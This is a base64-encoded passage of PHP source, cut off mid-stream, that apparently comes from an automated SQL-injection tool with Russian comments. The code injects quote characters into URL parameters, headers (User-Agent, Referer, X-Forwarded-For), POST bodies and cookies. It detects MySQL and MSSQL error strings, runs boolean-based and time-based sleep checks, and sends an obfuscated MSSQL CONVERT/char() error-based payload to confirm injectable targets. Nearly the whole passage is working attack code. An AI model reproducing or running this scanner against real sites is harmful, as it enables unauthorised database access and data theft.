LCAkZCkpCgkJewoJCQkkdGhpcy0+ZCgnYXNwIGxpbmsnKTsKCQkJCgkJCQoJCQlpZiggJHRoaXMtPmlual90ZXN0X2dldF9tc3NxbCgkdmFsdWVfb3JpZykpCgkJCXsKCQkJCSR0aGlzLT5tc3NxbCA9IHRydWU7CgkJCQlyZXR1cm4gJ21zc3FsIGVycm9yJzsKCQkJfWVsc2UKCQkJewoJCQkJJHRoaXMtPmQoJ2ZhbHNlIHRlc3RpbmdfbXNzcWwgcHJlZycpOwoJCQkJJHRoaXMtPm1zc3FsID0gZmFsc2U7CgkJCQkvL3JldHVybiBmYWxzZTsKCQkJfQoJCX0KCQkKCQkKCQkKCQkKCQkKCQkKCQkKCQkvLy8vL9Cf0L7QuNGB0Log0Y/QstC90YvRhSDQvtGI0LjQsdC+0LovLy8vLy8KCQkKCQkJCgkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJGQpOwoJCS8vJHRoaXMtPmQoJGZpbGUsJ2ZpbGUnKTsKCQkKCQlmb3JlYWNoICgkdGhpcy0+ZXJyb3JfdGV4dF9teXNxbCBhcyAka2V5KQoJCXsKCQkJaWYoc3Vic3RyX2NvdW50KCRmaWxlLCRrZXkpPjApCgkJCXsKCQkJCSR0aGlzLT5kKCRkLCdVUkwgZ29vZCBteXNxbCcpOwoJCQkJcmV0dXJuICRrZXk7CgkJCX0KCQl9CgkJCgkJaWYoJGZpbGU9PScnKQoJCXsKCQkJJHRoaXMtPmQoJ3N0b3AgdGsgZXJyb3IgcGhwID0gMScpOwkKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkKCQkKCQkKCQkvLy8vLy9Cb29sZWFuIEJhc2VkLy8vLy8vLy8KCQkKCQkkYm9vbGVhbiA9ICR0aGlzLT51cmxNdWx0aUNoZWNrbWV0aG9kKCR2YWx1ZV9vcmlnKTsKCQkKCQlpZigkdGhpcy0+cG9zdF9lbmFibGUpCgkJewoJCQkKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkKCQkvLyR0aGlzLT5kKCRib29sZWFuLCckYm9vbGVhbicpOwoJCQoJCWlmKCRib29sZWFuKQoJCXsJCgkJCXJldHVybiAkYm9vbGVhbjsKCQl9ZWxzZQoJCXsKCQkJJHRoaXMtPmQoJ2ZhbHNlIGJvb2xlYW4nKTsKCQl9CgkJCgkJLy8vLy90aW1lIGJhc2VkLy8vLy8vLwoJCQoJCSR0aGlzLT5zbGVlcF9jaGVjazEgPSB0cnVlOy8v0YLQvtC70YzQutC+INGD0YHRgtCw0L3QvtCy0LrQsCBzcWxpCgkJJHRoaXMtPnNsZWVwX2NoZWNrMiA9IGZhbHNlOy8v0LHQvtC70LXQtSDQv9C+0LTRgNC+0LHQvdCw0Y8g0L/RgNC+0LLQtdGA0LrQsCDQvtGC0LrQu9GO0YfQtdC90LAKCQkKCQkKCQkkc2xlZXAgPSAkdGhpcy0+c3FsaSgkdmFsdWUpOwoJCQoKCQlpZigkc2xlZXAgIT09IEZBTFNFKQoJCXsKCQkJcmV0dXJuICRzbGVlcDsKCQl9ZWxzZQoJCXsKCQkJCgkJCSR0aGlzLT5kKCdmYWxzZSBzbGVlcF9zcWxpJyk7CgkJCQoJCQlpZigkdGhpcy0+bXlzcWxGaW5kRXJyb3JTcWwoKT09dHJ1ZSl7CgkJCQlyZXR1cm4gJ215c3FsRmluZEVycm9yU3FsJzsJCgkJCX1lbHNlewoJCQkJJHRoaXMtPmQoJ2ZhbHNlIG15c3FsRmluZEVycm9yU3FsJyk7CgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+bXlzcWxGaW5kRXJyb3JTcWxOZXcoKT09dHJ1ZSl7CgkJCQlyZXR1cm4gJ215c3FsRmluZEVycm9yU3FsTmV3JzsJCgkJCX1lbHNlewoJCQkJJHRoaXMtPmQoJ2ZhbHNlIG15c3FsRmluZEVycm9yU3FsTmV3Jyk7CgkJCX0KCQkJCgkJCQoJCQkKCQkJcmV0dXJuIEZBTFNFOwoJCX0KCQkKCQkKCX0KCQoJZnVuY3Rpb24gaW5qX3Rlc3RfaGVhZCgkdXJsLCRocyl7IC8v0JjQtNC10YIg0Lgg0LrQsNC6INGB0LDQvNC+0YHRgtC+0Y/RgtC10LvRjNC90LDRjyDRhNGD0L3QutGG0LjRjyDQtNC70Y8g0L/RgNC+0LLQtdGA0LrQuCDQt9Cw0LPQvtC70L7QstC60L7QsiDQsiDQvdGD0LbQvdC+0Lwg0YTQvtGA0LzQsNGC0LUg0YLQsNC6INC4INC/0L7QtCDQv9C+0LTRhNGD0L3QutGG0LjRjwoJCQoJCQoJCWlmKCRoc1sndXJsJ10gIT0nJykkdXJsID0gJGhzWyd1cmwnXTsKCQkkdGhpcy0+Y2hlY2tfaHR0cHMoJHVybCwkaHMpOwoJCSR1cmwgPSAkdGhpcy0+ZmlsdGVyX3VybCgkdXJsKTsJCgkJCgkJCgkJCgkJJHRoaXMtPmhlYWRlciA9IHRydWU7CgkJJHRoaXMtPmhlYWRfZW5hYmxlPXRydWU7CgkJCgkJJGhlYWQgPSAkaHNbJ2luamVjdCddOwoJCQoJCQoJCWlmKCR0aGlzLT5wb3N0X2VuYWJsZSkKCQl7CgkJCSR2YWx1ZSA9ICR0aGlzLT5mb3JtX3NldFsnZm9ybV9wYWdlX2FjdCddOwoJCQkkcXVlcnkgPSAkdGhpcy0+Zm9ybV9zZXRbJ2Zvcm1fcG9zdF9xdWVyeSddOwoJCQkKCQkJCgkJCSR2YWx1ZV9vcmlnID0gJHF1ZXJ5OwoJCQkKCQkJJGQgPSAkcXVlcnk7CgkJCSRkID0gc3RyX3JlcGxhY2UoJyZhbXA7JywgIiYiLCAkZCk7CgkJCSRkIC49ICInXCIiOwoJCQkkZCA9IHN0cl9yZXBsYWNlKCImIiwiJyYiLCRkKTsKCQkJCgkJCSR0aGlzLT5mb3JtX3NldFsnZm9ybV9wb3N0X3F1ZXJ5J10gPSAkZDsKCQl9ZWxzZQoJCXsKCQkKCQl9CgkJCgkJJHRtcCA9IHBhcnNlX3VybCgkdXJsKTsvL9C+0YLQv9Cw0YDQstC70Y/QtdC8INCx0LXQtyBodHRwINGH0YLQvtCx0Ysg0LLRi9GC0LDRidC40YLRjCDRh9C40YHRgtGL0LkgdXJsINC90LAg0LLRgdGP0LrQuNC5CgkJJHVybCA9JHRtcFsncGF0aCddOyAKCQkvLyR0aGlzLT5kKCR0bXAsJyR0bXAyMiBCRUZPUkUgaW5qX3Rlc3RfZ2V0X2hlYWQnKTsKCQkKCQoJCgkJCgkJJHRoaXMtPnZhbHVlX29yaWc9JHZhbHVlOwoJCSR2YWx1ZV9vcmlnID0gJHZhbHVlOwoJCQoJCQoJCS8vJHRoaXMtPmQoJHVybCwnJHVybCBpbmpfdGVzdF9nZXRfaGVhZCcpOwoJCS8vZXhpdDsKCQlpZigkaGVhZCA9PSAndXNlcmFnZW50JykKCQl7CgkJCSR0aGlzLT5tZXRob2Rfb2xkID10cnVlOwoJCQkkdGhpcy0+aF9zWyd1c2VyYWdlbnQnXSA9ICdtb3ppbGxhJzsKCQkJJHRoaXMtPmhfc1sndXNlcmFnZW50J10gLj0gIidcIiI7CgkJCQoJCX1lbHNlaWYoJGhlYWQgPT0gJ3JlZmVyZXInKQoJCXsKCQkJJHRoaXMtPm1ldGhvZF9vbGQgPXRydWU7CgkJCSR0aGlzLT5oX3NbJ3JlZmVyZXInXSA9ICAgJ2dvb2dsZS5jb20nOwoJCQkkdGhpcy0+aF9zWydyZWZlcmVyJ10gICAgLj0gIidcIiI7CgkJCSR0aGlzLT5tZXRob2Rfb2xkPXRydWU7CgkJCQoJCX1lbHNlaWYoJGhlYWQgPT0gJ2ZvcndhcmRlcicpCgkJewoJCQkkdGhpcy0+bWV0aG9kX29sZCA9dHJ1ZTsKCQkJJHRoaXMtPmhfc1snZm9yd2FyZGVyJ10gPSAnOC44LjguOCc7CgkJCSR0aGlzLT5oX3NbJ2ZvcndhcmRlciddIC49ICInXCIiOwoJCQkkdGhpcy0+bWV0aG9kX29sZD10cnVlOwoJCX1lbHNlaWYoJGhlYWQgPT0gJ3Bvc3QnKQoJCXsKCQkJJHRoaXMtPmhfc1sncG9zdCddID0gICAgICAkaHNbJ3Bvc3QnXTsKCQkJJHRoaXMtPmhfc1sncG9zdCddID0gc3RyX3JlcGxhY2UoJyZhbXA7JywgIiYiLCAkdGhpcy0+aF9zWydwb3N0J10pOwoJCQkkdGhpcy0+aF9zWydwb3N0J10gLj0gIidcIiI7CgkJCSR0aGlzLT5oX3NbJ3Bvc3QnXSA9IHN0cl9yZXBsYWNlKCImIiwiJ1wmIiwkdGhpcy0+aF9zWydwb3N0J10pOwoJCQkKCQl9ZWxzZWlmKCRoZWFkID09ICdjb29raWVzJykKCQl7CgkJCQoJCQlpZigkaHNbJ2Nvb2tpZXMnXSAhPScnKXsKCQkJCSR0aGlzLT5oX3NbJ2Nvb2tpZXMnXSA9ICAgJGhzWydjb29raWVzJ107CgkJCQkJCgkJCX1lbHNlewoJCQkJJHRoaXMtPmhfc1snY29va2llcyddID0gICAkdGhpcy0+aF9zWydjb29raWVzJ107CgkJCX0KCQkJCgkJCSR0aGlzLT5oX3NbJ2Nvb2tpZXMnXSAuPSAiJ1wiIjsKCQkJJHRoaXMtPmhfc1snY29va2llcyddID0gc3RyX3JlcGxhY2UoIiYiLCInJiIsJHRoaXMtPmhfc1snY29va2llcyddKTsKCQl9CgkJCgkJCgkJaWYoJGhzWydjb29raWVzX3N0YXRpYyddICE9JycpCgkJewoJCQkkdGhpcy0+aF9zWydjb29raWVzX3N0YXRpYyddID0gICAkaHNbJ2Nvb2tpZXNfc3RhdGljJ107CgkJfQoJCQoJCQoJCQoJCSR0aGlzLT5oX3NbJ3Bvc3Rfc3RhdGljJ10gPSAgJGhzWydwb3N0X3N0YXRpYyddOwoJCQoJCSR0aGlzLT5oX3NbJ3NxbGknXSA9ICAkaHNbJ3NxbGknXTsKCQkKCQkkdGhpcy0+aF9zWydpbmplY3QnXSA9ICRoZWFkOwoJCQoJCSR0aGlzLT5oX3NbJ3VybCddID0gICR1cmw7CgkJCgkJJHRoaXMtPmhfc1snZGF0YSddID0gJHRoaXMtPmhfc1skaGVhZF07CgkJCQoJCQkKCQlpZigkdGhpcy0+aF9zWydkYXRhJ10gIT0nJykKCQl7CgkJCSR1cmwgPSAkdXJsMiA9ICR1cmwuIj8iLiR0aGlzLT5oX3NbJ2RhdGEnXTsKCQkJJHVybDIgPSBzdHJfcmVwbGFjZShhcnJheSgiJyIsJyInKSwnJywkdXJsMik7CgkJCQoJCX1lbHNlewoJCQkKCQkJJHRoaXMtPmQoJ0hFQUQgSU5KRUNUIEVNUFRZJyk7CgkJCXJldHVybiBmYWxzZTsKCQl9CQoJCQoJCQoJCQkvLy8vL9Cf0L7QuNGB0Log0Y/QstC90YvRhSDQvtGI0LjQsdC+0LovLy8vLy8KCQkkdGhpcy0+ZCgkdXJsLCd1cmwgQUZURVIgaW5qX3Rlc3RfZ2V0X2hlYWQnKTsKCQkvLyR0aGlzLT5kKCR1cmwyLCd1cmwyIEFGVEVSIGlual90ZXN0X2dldF9oZWFkJyk7CgkJCgkJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkJCgkJCgkJCgkJCgkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybCk7CgkJLy8kdGhpcy0+ZCgkZmlsZSwnZmlsZSBIRUFEJyk7CgkJCgkJLy8kdGhpcy0+ZCgkdGhpcy0+ZXJyb3JfdGV4dF9teXNxbCwnJHRoaXMtPmVycm9yX3RleHRfbXlzcWwnKTsKCQkvL2RpZTsKCQkKCQkKCQkKCQlmb3JlYWNoICgkdGhpcy0+ZXJyb3JfdGV4dF9teXNxbF9oZWFkIGFzICRrZXkpCgkJewoJCQlpZihzdWJzdHJfY291bnQoJGZpbGUsJGtleSk+MCkKCQkJewoJCQkJJHRoaXMtPmQoJHVybDIsJ1VSTCBIRUFEIGdvb2QgbXlzcWw6OjonLiAka2V5KTsKCQkJCXJldHVybiAka2V5OwoJCQkJLy9yZXR1cm4gJGhlYWQ7CgkJCX0KCQl9CgkJCgkJaWYoJGZpbGU9PScnKQoJCXsKCQkJJHRoaXMtPmQoJ3N0b3AgdGsgZXJyb3IgcGhwID0gMScpOwkKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkKCQkvL3JldHVybiBmYWxzZTsKCQkKCQkkdGhpcy0+c2xlZXBfY2hlY2sxID0gdHJ1ZTsvL9GC0L7Qu9GM0LrQviDRg9GB0YLQsNC90L7QstC60LAgc3FsaQoJCSR0aGlzLT5zbGVlcF9jaGVjazIgPSBmYWxzZTsvL9Cx0L7Qu9C10LUg0L/QvtC00YDQvtCx0L3QsNGPINC/0YDQvtCy0LXRgNC60LAg0L7RgtC60LvRjtGH0LXQvdCwCgkJCgkJCgkJJHNsZWVwID0gJHRoaXMtPnNxbGkoJHVybDIpOwoJCQoKCQlpZigkc2xlZXAgIT09IEZBTFNFKQoJCXsKCQkJcmV0dXJuICRzbGVlcDsKCQl9ZWxzZQoJCXsKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkKCQkKCQkKCQkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCQkKCQkKCQkKCQkKCX0KCQoJCgkKCQoJCglmdW5jdGlvbiBpbmpfdGVzdF9nZXRfbXNzcWwoJHZhbHVlPScnKXsgLy8gZXJyb3JGaW5kZXIg0L/QtdGA0LLQvtC90LDRh9Cw0LvRjNC90LDRjyDQv9GA0L7QstC10YDQutCwINC90LAg0L7RiNC40LHQutC4IG1zc3FsCgkJCgkJCgkJJHVybDIgPSAkdGhpcy0+ZmlsdGVyX3VybCgkdmFsdWUpOwoJCQoJCQoJCQoKCQkkdXJscyA9ICR0aGlzLT51cmxQYXJzZVVybCgkdXJsMik7CgkJCgkJLy8kdGhpcy0+ZCgkdXJscywnJHVybHMnKTsKCQkKCQkKCQkKCQlmb3JlYWNoICgkdXJscyBhcyAkdXJsX2NoZWspCgkJewoJCQkKCQkJJGxlbiA9IGljb252X3N0cnJwb3MoJHVybF9jaGVrLCc9Jyk7CgkJCS8vJHRoaXMtPmQoJGxlbiwnJGxlbicpOwoJCQkKCQkJJG5ld191cmxfY2hlayA9IHN1YnN0cigkdXJsX2NoZWssMCwkbGVuKzEpOwoJCQkvLyR0aGlzLT5kKCRuZXdfdXJsX2NoZWssJyRuZXdfdXJsX2NoZWsnKTsKCQkJLy9leGl0OwoJCQkKCQkJCgkJCSRuZXdfY2hlY2s9ICRuZXdfdXJsX2NoZWs7CgkJCQoJCQkkbmV3X2NoZWNrID0gJG5ld19jaGVjay4iJTJmKiolMmZjT25WZVJ0KGludCUyYyhjaGFyKDMzKSUyYmNoYXIoMTI2KSUyYmNoYXIoMzMpJTJiKGNoYXIoNjUpJTJiY2hhcig2NiklMmJjaGFyKDY3KSUyYmNoYXIoNDkpJTJiY2hhcig1MiklMmJjaGFyKDUzKSUyYmNoYXIoOTApJTJiY2hhcig4MSklMmJjaGFyKDU0KSUyYmNoYXIoNTApJTJiY2hhcig2OCklMmJjaGFyKDg3KSUyYmNoYXIoODEpJTJiY2hhcig2NSklMmJjaGFyKDcwKSUyYmNoYXIoODApJTJiY2hhcig3OSklMmJjaGFyKDczKSUyYmNoYXIoODkpJTJiY2hhcig2NyklMmJjaGFyKDcwKSUyYmNoYXIoNjgpKSUyYmNoYXIoMzMpJTJiY2hhcigxMjYpJTJiY2hhcigzMykpKSI7CgkJCQoJCQkKCQkJJGZpbGVfY2hlY2sgPSAkdGhpcy0+Z2V0Q29udGVudHMoJG5ld19jaGVjayk7CgkJCQoJCQkKCQkJCgkJCWlmKHN1YnN0cl9jb3VudCgkZmlsZV9jaGVjaywnIX4hQUJDMTQ1WlE2MkRXUUFGUE9JWUNGRCF+IScpPjApCgkJCQl7CgkJCQkJJHRoaXMtPmQoJG5ld19jaGVjaywnIX4hQUJDMTQ1WlE2MkRXUUFGUE9JWUNGRCF+IScpOwoJCQkJCXJldHVybiAnbXNzcWwgZXJyb3IgQUJDJzsKCQkJCX0KCQkJCgkJCQoJCQkKCQkJCgkJCQoJCQkKCQkJJGQgPSAkdXJsX2NoZWs7CgkJCSRkID0gc3RyX3JlcGxhY2UoJyZhbXA7JywgIiYiLCAkZCk7CgkJCSRkID0gc3RyX3JlcGxhY2UoIiYiLCInJiIsJGQpOwoJCQkkZCAuPSAiJzA9QSI7CgkJCQkvLyR0aGlzLT5kKCRkLCdkJyk7CgkJCQoJCQkKCQkJCgkJCgkJCQoJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkZCk7CgkJCQoJCQkKCQkJaWYoJGZpbGU9PScnKQoJCQl7CgkJCQkkdGhpcy0+ZCgnc3RvcCB0ayBlcnJvciBtc3NxbCA9IDEnKTsJCgkJCQlyZXR1cm4gZmFsc2U7CgkJCX0KCgkJCQoJCQkKCQkJZm9yZWFjaCAoJHRoaXMtPmVycm9yX3RleHRfbXNzcWwgYXMgJGtleSkKCQkJewoKCQkJCWlmKHN1YnN0cl9jb3VudCgkZmlsZSwka2V5KT4wKQoJCQkJewoJCQkJCSR0aGlzLT5kKCR1cmxfY2hlaywnZ29vZCB1cmwnKTsKCQkJCQlyZXR1cm4gJGtleTsKCQkJCX0KCQkJfQoJCQkKCQkJLy8kdGhpcy0+ZCgkZmlsZSwnJGZpbGUnKTsKCQkJLy9leGl0OwoJCQkJCgkJfQkKCQkKCQkKCQkKCQkKCQkKCQlyZXR1cm4gZmFsc2U7CgkJCgoJfQoJCQoJZnVuY3Rpb24gaW5qX3Rlc3RfaGVhZF9tc3NxbCgkdmFsdWU9JycpeyAvLyBlcnJvckZpbmRlciDQv9C10YDQstC+0L3QsNGH0LDQu9GM0L3QsNGPINC/0YDQvtCy0LXRgNC60LAg0L3QsCDQvtGI0LjQsdC60LggbXNzcWwKCQkKCQkKCQkkdXJsMiA9ICR0aGlzLT5maWx0ZXJfdXJsKCR2YWx1ZSk7CgkJCgkJCgkJCgoJCSR1cmxzID0gJHRoaXMtPnVybFBhcnNlVXJsKCR1cmwyKTsKCQkKCQkvLyR0aGlzLT5kKCR1cmxzLCckdXJscycpOwoJCQoJCQoJCQoJCWZvcmVhY2ggKCR1cmxzIGFzICR1cmxfY2hlaykKCQl7CgkJCQoJCQkkbGVuID0gaWNvbnZfc3RycnBvcygkdXJsX2NoZWssJz0nKTsKCQkJLy8kdGhpcy0+ZCgkbGVuLCckbGVuJyk7CgkJCQoJCQkkbmV3X3VybF9jaGVrID0gc3Vic3RyKCR1cmxfY2hlaywwLCRsZW4rMSk7CgkJCS8vJHRoaXMtPmQoJG5ld191cmxfY2hlaywnJG5ld191cmxfY2hlaycpOwoJCQkvL2V4aXQ7CgkJCQoJCQkKCQkJJG5ld19jaGVjaz0gJG5ld191cmxfY2hlazsKCQkJCgkJCSRuZXdfY2hlY2sgPSAkbmV3X2NoZWNrLiIlMmYqKiUyZmNPblZlUnQoaW50JTJjKGNoYXIoMzMpJTJiY2hhcigxMjYpJTJiY2hhcigzMyklMmIoY2hhcig2NSklMmJjaGFyKDY2KSUyYmNoYXIoNjcpJTJiY2hhcig0OSklMmJjaGFyKDUyKSUyYmNoYXIoNTMpJTJiY2hhcig5MCklMmJjaGFyKDgxKSUyYmNoYXIoNTQpJTJiY2hhcig1MCklMmJjaGFyKDY4KSUyYmNoYXIoODcpJTJiY2hhcig4MSklMmJjaGFyKDY1KSUyYmNoYXIoNzApJTJiY2hhcig4MCklMmJjaGFyKDc5KSUyYmNoYXIoNzMpJTJiY2hhcig4OSklMmJjaGFyKDY3KSUyYmNoYXIoNzApJTJiY2hhcig2OCkpJTJiY2hhcigzMyklMmJjaGFyKDEyNiklMmJjaGFyKDMzKSkpIjsKCQkJCgkJCQoJCQkkZmlsZV9jaGVjayA9ICR0aGlzLT5nZXRDb250ZW50cygkbmV3X2NoZWNrKTsKCQkJCgkJCQoJCQkKCQkJaWYoc3Vic3RyX2NvdW50KCRmaWxlX2NoZWNrLCchfiFBQkMxNDVaUTYyRFdRQUZQT0lZQ0ZEIX4hJyk+MCkKCQkJCXsKCQkJCQkkdGhpcy0+ZCgkbmV3X2NoZWNrLCchfiFBQkMxNDVaUTYyRFdRQUZQT0lZQ0ZEIX4hJyk7CgkJCQkJcmV0dXJuICdtc3NxbCBlcnJvciBBQkMnOwoJCQkJfQoJCQkKCQkJCgkJCQoJCQkKCQkJCgkJCQoJCQkkZCA9ICR1cmxfY2hlazsKCQkJJGQgPSBzdHJfcmVwbGFjZSgnJmFtcDsnLCAiJiIsICRkKTsKCQkJJGQgPSBzdHJfcmVwbGFjZSgiJiIsIicmIiwkZCk7CgkJCSRkIC49ICInMD1BIjsKCQkJCS8vJHRoaXMtPmQoJGQsJ2QnKTsKCQkJCgkJCQoJCQkKCQkKCQkJCgkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCRkKTsKCQkJCgkJCQoJCQlpZigkZmlsZT09JycpCgkJCXsKCQkJCSR0aGlzLT5kKCdzdG9wIHRrIGVycm9yIG1zc3FsID0gMScpOwkKCQkJCXJldHVybiBmYWxzZTsKCQkJfQoKCQkJCgkJCQoJCQlmb3JlYWNoICgkdGhpcy0+ZXJyb3JfdGV4dF9tc3NxbCBhcyAka2V5KQoJCQl7CgoJCQkJaWYoc3Vic3RyX2NvdW50KCRmaWxlLCRrZXkpPjApCgkJCQl7CgkJCQkJJHRoaXMtPmQoJHVybF9jaGVrLCdnb29kIHVybCcpOwoJCQkJCXJldHVybiAka2V5OwoJCQkJfQoJCQl9CgkJCQoJCQkvLyR0aGlzLT5kKCRmaWxlLCckZmlsZScpOwoJCQkvL2V4aXQ7CgkJCQkKCQl9CQoJCQoJCQoJCQoJCQoJCQoJCXJldHVybiBmYWxzZTsKCQkKCgl9CgkJCgkJCgkJCgkKCQoJCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkvLy8vLy/QndCQ0KXQntCW0JXQndCY0JUg0JzQldCi0J7QlNCQKNC/0LXRgNC10LHQvtGALNC+0YjQuNCx0LrQsCkg0JTQm9CvIFNRTEkg0LjQvdGK0LXQutGG0LjQuC8vLy8vLy8KCS8vLy8vINCt0KLQniDQlNCb0K8g0J7Qn9Cg0JXQlNCV0JvQldCd0JjQryDQmtCQ0JrQmNCcINCh0J/QntCh0J7QkSDQkdCj0JTQldCiINCb0J7QnNCQ0KLQrNCh0K8gVVJMINCyIFNUQVJUUyDQrtCX0JDQldCi0KHQrywg0L3QtSDRg9GH0LDQtdGC0YHRjyDQsiDQt9Cw0L/RgNC+0YHQsNGFLy8vCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCglmdW5jdGlvbiBpbmplY3QoJHVybCwkZGF0YT1mYWxzZSwkc2V0PWZhbHNlLCRwb3N0PWZhbHNlKXsvL9GE0YPQutC90YbQuNGPINC/0YDQtdC00YDQsNGB0L/RgNC10LTQtdC70LXQvdC40Y8KCQkKCQkkdGhpcy0+Y2hlY2tfaHR0cHMoJHVybCwkdGhpcy0+aF9zKTsKCQkkdXJsID0gJHRoaXMtPmZpbHRlcl91cmwoJHVybCk7CgkJCgkJCgkJCgkJaWYoJHRoaXMtPmNoZWNrX2hlYWQoJHVybCk9PXRydWUpCgkJewoJCQkkdGhpcy0+ZCgnaGVhZCBTVEFSVCcpOwoJCQkkdXJsID0gc3RyX3JlcGxhY2UoJ3Bvc3Q6OicsJycsJHVybCk7CgkJCSRyZXMgPSAkdGhpcy0+aGVhZF9pbmplY3QoJHVybCwkdGhpcy0+aF9zLCRkYXRhLCRzZXQsJHBvc3QpOwoJCQlyZXR1cm4gJHJlczsKCQl9ZWxzZQoJCXsKCQkJCgkJCSRyZXMgPSAkdGhpcy0+Z2V0X2luamVjdCgkdXJsLCRkYXRhLCRzZXQsJHBvc3QpOwoJCQlyZXR1cm4gJHJlczsKCQoJCQkKCQl9Cgl9CgkKCWZ1bmN0aW9uIGdldF9pbmplY3QoJHVybCwkZGF0YT1mYWxzZSwkc2V0PWZhbHNlLCRwb3N0PWZhbHNlKXsvL9C00L7Rh9C10YDQvdGP0Y8gU1RBUlQg0Lgg0LTQsNC70LXQtSDQvtC/0YDQtdC00LXQu9C90LjQtSDQvdCwINGD0Y/Qt9Cy0LjQvNC+0YHRgtGMIAoJCQoJCQoJCQoJCS8vJHRoaXMtPmQoJHRoaXMtPmh0dHBzLCdodHRwcyBQUk9WRVJLQScpOwoJCS8vZXhpdDsKCQkKCQkkdGhpcy0+c2xlZXBfY2hlY2syID0gVFJVRTsKCQkkdGhpcy0+aHR0cHNfY2hlY2s9ZmFsc2U7Ly/RgdCx0YDQvtGB0LjRgtGMINGB0YfRkdGCINC/0YDQvtCy0LXRgNC60Lgg0L3QsCBodHRwcwoKCQkkdGhpcy0+Y2hlY2tfaHR0cHMoJHVybCk7CgkJJHRoaXMtPnVybCA9ICR0aGlzLT5maWx0ZXJfdXJsKCR1cmwpOwoJCQoJCS8vJHRoaXMtPmQoJHRoaXMtPmh0dHBzLCdodHRwcyBLVT8nKTsKCQkvLyR0aGlzLT5kKCR0aGlzLT51cmwsJyR0aGlzLT51cmwnKTsKCQkvL2V4aXQ7CgkJCgkKCQkKCQlpZigkdGhpcy0+aGVhZF9lbmFibGU9PXRydWUpCgkJewoKCQkJLy/Qv9C+0LTQvNC10L3QvdGL0LkgdXJsINC60LDQuiDQt9C90LDRh9C10L3QuNC1IFBPU1QKCQkJCQkJCgkJCSR2YWx1ZSA9JHRoaXMtPnVybDsKCQkJCgkJCSR0aGlzLT51cmwyID0gJHRoaXMtPmZpbHRlcl91cmwoJHZhbHVlKTsKCgkJCWlmKCR0aGlzLT5wb3N0X2Z1bGw9PSB0cnVlKQoJCQl7CgkJCQkKCQkJCSR0aGlzLT5nZXRDb250ZW50cygkdXJsKTsKCQkJCXJldHVybjsKCQkJfQoJCQoJCX0KCQkKCQkKCgkJCgkJCQoJCQkKCQlpZiAocHJlZ19tYXRjaCgnL1wuYXNwfFwuY2ZtL3NpJywgJHRoaXMtPnVybCkpCgkJewoJCQkvLyR0aGlzLT5kKCdhc3AgY2ZtIGxpbmsgaW5qZWN0Jyk7CgkJCQoJCQlpZigkdGhpcy0+bXNzcWxfY2hlY2s9PXRydWUpCgkJCXsKCQkJCgkJCQlpZigkdGhpcy0+bXNzcWwgPT0gZmFsc2UpCgkJCQl7CgkJCQkJCgkJCQkJCgkJCQkJaWYoICR0aGlzLT5pbmpfdGVzdF9nZXRfbXNzcWwoJHRoaXMtPnVybCkpCgkJCQkJewoJCQkJCQkkdGhpcy0+ZCgnaW5qX3Rlc3RfZ2V0X21zc3FsIElOSkVDVCBUUlVFIElOSkVDVCBQUkVEVkFSSVRFTE5PJyk7CgkJCQkJCSR0aGlzLT5tc3NxbCA9IHRydWU7CgkJCQkJfWVsc2UKCQkJCQl7CgkJCQkJCSR0aGlzLT5kKCdmYWxzZSB0ZXN0aW5nX21zc3FsIHByZWcgVk9aTU9KTk8gTVlTUUwnKTsKCQkJCQkJJHRoaXMtPm1zc3FsID0gZmFsc2U7CgkJCQkJCS8vcmV0dXJuIGZhbHNlOwoJCQkJCX0KCQkJCX0KCQkJCgkJCX0KCQkJCgkJCQoJCX1lbHNlCgkJewoJCQkkdGhpcy0+bXNzcWwgPSBmYWxzZTsJCgkJfQoJCQoJCS8vZXhpdDsKCQkKCQkKCQkJCQoJCWlmKCRkYXRhIT09ZmFsc2UpCgkJewkKCQkJCQoJCQkvLyR0aGlzLT5kKCRkYXRhLCdkYXRhIHllcycpOwoJCQkvL2V4aXQ7CgkJCQoJCQoJCQlpZihpc3NldCgkZGF0YVsncG9zdHNfb25lJ10pIG9yICRkYXRhWydwb3N0c19vbmUnXSAhPScnKQoJCQl7CgkJCQkkZGF0YVsncG9zdHMnXSA9ICRkYXRhWydwb3N0c19vbmUnXTsKCQkJCQoJCQl9CgkJCQoJCQkKCQkJaWYoJGRhdGFbJ3Bvc3RzJ11bJ2h0dHAnXSA9PSdodHRwcycgb3IgJGRhdGFbJ3Bvc3RzJ11bJ2h0dHAnXSA9PSdodHRwczovLycpCgkJCXsKCQkJCSR0aGlzLT5odHRwcz10cnVlOwoJCQkJJHRoaXMtPmh0dHBzX2NoZWNrPXRydWU7CgkJCX0JCgkJCQoJCQkKCQkKCQkJaWYoJGRhdGFbJ3Bvc3RzJ11bJ21ldGhvZCddPT0xMCBBTkQgJHRoaXMtPnNsZWVwX21ldG9kICE9dHJ1ZSkKCQkJewoJCQkJLy8kdGhpcy0+ZCgnbWV0aG9kID0gMTAgYW5kIHNsZWVwIGZhbHNlJyk7CgkJCQkvL3JldHVybiBmYWxzZTsKCQkJfQoJCQoJCQkKCQkJJHRoaXMtPnNwb3NvYiAgPSAkZGF0YVsncG9zdHMnXVsnc3Bvc29iJ107CgkJCSR0aGlzLT5tZXRob2QgID0gJGRhdGFbJ3Bvc3RzJ11bJ21ldGhvZCddOwoJCQkKCQkJCgkJCWlmKGludHZhbCgkZGF0YVsncG9zdHMnXVsnc3Bvc29iJ10pPT0wKXsKCQkJCSR0aGlzLT5nZXRfYnlfZXJyb3I9Jyc7CgkJCX0KCQkJCgkJCWlmKGludHZhbCgkZGF0YVsncG9zdHMnXVsnc3Bvc29iJ10pPT0xKXsKCQkJCSR0aGlzLT5nZXRfYnlfZXJyb3I9JyUyNyc7Cgk